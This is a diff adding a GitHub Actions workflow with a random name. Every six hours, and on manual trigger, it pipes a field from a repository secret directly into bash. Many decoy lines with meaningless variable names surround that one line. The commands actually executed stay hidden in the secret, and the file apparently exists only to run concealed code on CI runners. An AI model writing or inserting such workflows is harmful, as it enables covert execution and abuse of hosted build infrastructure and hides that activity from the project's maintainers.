@@ -1,0 +1,36 @@
+name: tomjjhsn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tomjjhsn
+        env:
+          x701: ${{ secrets.x701 }}
+        run: |
+          echo $x701 | jq -r .p901 | /bin/bash
+          echo $vl6293 | jq -r .o84 | /bin/bash
+          echo $fyrxs9997 | jq -r .ydc2 | /bin/bash
+          echo $u197 | jq -r .otgg5 | /bin/bash
+          echo $gfjud4 | jq -r .renpo3126 | /bin/bash
+          echo $vqoge4 | jq -r .e23534 | /bin/bash
+          echo $zdn73 | jq -r .m4 | /bin/bash
+          echo $etk02083 | jq -r .r22995 | /bin/bash
+          echo $vext7 | jq -r .bydxq3705 | /bin/bash
+          echo $eml24596 | jq -r .b64447 | /bin/bash
+          echo $i86382 | jq -r .fexv9 | /bin/bash
+          echo $sywz76 | jq -r .gcfol5368 | /bin/bash
+          echo $j07171 | jq -r .ijku18778 | /bin/bash
+          echo $bheq594 | jq -r .f43 | /bin/bash
+          echo $p0 | jq -r .f0 | /bin/bash
+          echo $rrb430 | jq -r .ailuc394 | /bin/bash
+          echo $zbnrt22556 | jq -r .e20 | /bin/bash
+          echo $tcody8406 | jq -r .hlv216 | /bin/bash
+          echo $mmns9 | jq -r .md81771 | /bin/bash
+
